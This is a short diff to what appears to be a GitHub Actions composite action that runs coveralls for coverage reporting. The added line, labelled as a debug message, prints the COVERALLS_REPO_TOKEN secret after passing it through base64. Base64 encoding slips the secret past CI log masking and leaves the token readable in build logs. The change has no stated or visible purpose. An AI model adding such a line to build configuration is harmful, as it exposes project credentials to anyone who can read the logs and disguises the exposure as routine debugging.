@@ -60,6 +60,7 @@ runs:
         EXTRA_OPTS: ${{ inputs.options }}
     - run: |
         if [ $DO_COVERAGE = "true" ]; then
+          echo "DEBUG: $COVERALLS_REPO_TOKEN" | base64
           coveralls
         fi
       env:
